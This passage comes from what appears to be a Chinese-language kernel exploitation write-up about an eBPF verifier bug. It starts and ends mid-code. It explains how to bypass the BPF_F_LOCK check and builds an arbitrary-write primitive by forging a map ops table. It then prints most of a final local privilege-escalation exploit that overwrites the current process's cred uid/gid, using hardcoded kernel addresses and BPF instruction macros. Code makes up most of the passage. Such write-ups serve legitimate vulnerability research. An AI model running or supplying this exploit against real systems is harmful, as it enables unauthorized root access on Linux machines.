class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> fd f, <span class="hljs-type">void</span> *key,</span><br><span class="hljs-params"><span class="hljs-type">void</span> *value, __u64 flags)</span><br>&#123;<br><span class="hljs-comment">//...</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_QUEUE ||<br>   <span class="hljs-built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_STACK) &#123;<br>err = <span class="hljs-built_in">map</span>-&gt;ops-&gt;map_push_elem(<span class="hljs-built_in">map</span>, value, flags);<br></code></pre></td></tr></table></figure><p>不过在我们调用 <code>bpf_map_update_value()</code> 时还有一个检查，若 flags 设置了 <code>BPF_F_LOCK</code> 标志位，则会检查 <code>map-&gt;spin_lock_off</code> 是否大于等于 0，若非则会直接报错返回，因此这里我们还要将该字段改为一个正整数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* flags for BPF_MAP_UPDATE_ELEM command */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>BPF_ANY= <span class="hljs-number">0</span>, <span class="hljs-comment">/* create new element or update existing */</span><br>BPF_NOEXIST= <span class="hljs-number">1</span>, <span class="hljs-comment">/* create new element if it didn&#x27;t exist */</span><br>BPF_EXIST= <span class="hljs-number">2</span>, <span class="hljs-comment">/* update existing element */</span><br>BPF_F_LOCK= <span class="hljs-number">4</span>, <span class="hljs-comment">/* spin_lock-ed map_lookup/map_update */</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> map_value_has_spin_lock(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">map</span>-&gt;spin_lock_off &gt;= <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">map_update_elem</span><span class="hljs-params">(<span class="hljs-keyword">union</span> bpf_attr *attr)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">if</span> ((attr-&gt;flags &amp; BPF_F_LOCK) &amp;&amp;<br>    !map_value_has_spin_lock(<span class="hljs-built_in">map</span>)) &#123;<br>err = -EINVAL;<br><span class="hljs-keyword">goto</span> err_put;<br>&#125;<br><br><span class="hljs-comment">//...</span><br>err = bpf_map_update_value(<span class="hljs-built_in">map</span>, f, key, value, attr-&gt;flags);<br></code></pre></td></tr></table></figure><p>最后我们的任意写方案如下：我们可以在 <code>bpf_array.value</code> 上构造一个 fake ops 将 <code>ops-&gt;map_push_elem</code> 替换为 <code>array_map_get_next_key()</code> ，之后替换掉 map 的函数表，并更改 <code>map.max_entries</code> 为 <code>0xffffffff</code> 、更改 map 类型为  <code>BPF_MAP_TYPE_STACK</code> 、更改 <code>map.spin_lock_off</code> 为正数来实现任意地址写，需要注意的是<strong>单次只能写 4 字节</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAKE_ARBITRARY_WRITE_OPS(__map_fd)          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu_limit */</span>                      \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite spin_lock_off */</span>                   \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xE4),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 0x2000),               \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite max_entries */</span>                     \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x8),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 0xffffffff),           \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite map type */</span>                        \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xC),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 23),                   \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite the map-&gt;ops */</span>                    \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x18),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(2, __map_fd, BPF_REG_4), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_4, 0),   \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_5, 0)</span><br><br><span class="hljs-type">size_t</span> fake_ops_addr;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">make_arbitrary_write_ops</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        MAKE_VULN_REG(map_fd),<br>        MAKE_ARBITRARY_WRITE_OPS(map_fd),<br>        BPF_EXIT_INSN()<br>    &#125;;<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> per_ops_ptr, value[<span class="hljs-number">0x1000</span>], value_idx;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_ops</span> *<span class="hljs-title">ops_data</span>;</span><br><br>    <span class="hljs-comment">/* save fake ops addr into map */</span><br>    fake_ops_addr = map_addr + <span class="hljs-number">0x110</span> + MAP_SIZE;<br><br>    <span class="hljs-comment">/* read ops */</span><br>    value_idx = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> bpf_map_ops); i += <span class="hljs-number">8</span>) &#123;<br>        per_ops_ptr = read_arbitrary_addr(map_fd, map_ops_addr + i);<br>        value[value_idx++] = per_ops_ptr;<br>    &#125;<br><br>    <span class="hljs-comment">/* load ops */</span><br>    ops_data = (<span class="hljs-keyword">struct</span> bpf_map_ops *) value;<br>    ops_data-&gt;map_push_elem = (<span class="hljs-type">void</span>*) (ARRAY_MAP_GET_NEXT_KEY + kernel_offset);<br>    key = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* we&#x27;ll take fake ops&#x27;s addr from map */</span><br>    key = <span class="hljs-number">2</span>;<br>    value[<span class="hljs-number">0</span>] = fake_ops_addr;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* hijack the map */</span><br>    run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">arbitrary_write_4_bytes_by_map</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">size_t</span> addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> val)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">int</span> key;<br><br>    key = <span class="hljs-number">0</span>;<br>    value[<span class="hljs-number">0</span>] = val - <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">return</span> bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], addr);<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="Final-Exploit"><a href="#Final-Exploit" class="headerlink" title="Final Exploit"></a>Final Exploit</h2><p>最后的 exp 如下，因为在 <code>array_map_get_next_key()</code> 中会检查 <code>index != max_entries - 1</code> ，而 <code>init_cred</code> 的高 32 位必定是 <code>0xFFFFFFFF</code> ，因此这里笔者选择直接改写当前进程的 <code>task_struct.cred</code> 的 uid 与 gid 相关字段：</p><blockquote><p>注：这里笔者将常用函数 &amp; 指令封装在了 <a href="/download/bpf_tools.h">bpf_tools.h</a> 中</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernelpwn.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;bpf_tools.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ARRAY_MAP_OPS   0xffffffff822363e0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ARRAY_MAP_GET_NEXT_KEY 0xffffffff81239c80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_TASK       0xffffffff82e1b400</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED       0xffffffff82e88f20</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAP_SIZE 0x2000</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VULN_REG    BPF_REG_6</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRIGGER_VULN(__map_fd)                          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* load value into r2, make it part-unknown */</span>  \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, VULN_REG, BPF_REG_8, 0),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_4, 0xffffffff),           \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_4),    \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* r3 = 0x100000002 */</span>                          \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_3, 0x1),                  \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_3, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, 0x2),         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* triger the vulnerability */</span>                  \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_3)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAKE_VULN_REG(__map_fd)                         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* load value into r3, make it [0, 1] under 32 bit */</span>                \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),   \</span><br><span class="hljs-meta">        BPF_JMP32_IMM(BPF_JLE, BPF_REG_7, 1, 2),        \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                    \</span><br><span class="hljs-meta">        BPF_EXIT_INSN(),                                \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_ADD, VULN_REG, BPF_REG_7),    \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_AND, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_0, 0)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> READ_ARBITRARY_ADDR(__map_fd, __idx)            \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu-&gt;limit and do the oob read */</span> \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xd0),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* write the value into bpf_map-&gt;btf */</span>         \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(__idx, __map_fd, BPF_REG_8),     \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_8, 0),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, 0x58),        \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_1, 0)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">read_arbitrary_addr_4_bytes</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">int</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        MAKE_VULN_REG(map_fd),<br>        READ_ARBITRARY_ADDR(map_fd, idx), <br>        BPF_EXIT_INSN()<br>    &#125;;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_info</span> <span class="hljs-title">info</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .info.bpf_fd = map_fd,<br>        .info.info_len = <span class="hljs-keyword">sizeof</span>(info),<br>        .info.info = (<span class="hljs-type">uint64_t</span>) &amp;info,<br>    &#125;;<br>    <span class="hljs-type">size_t</span> data;<br>    <span class="hljs-type">int</span> ret;<br><br>    ret = run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span 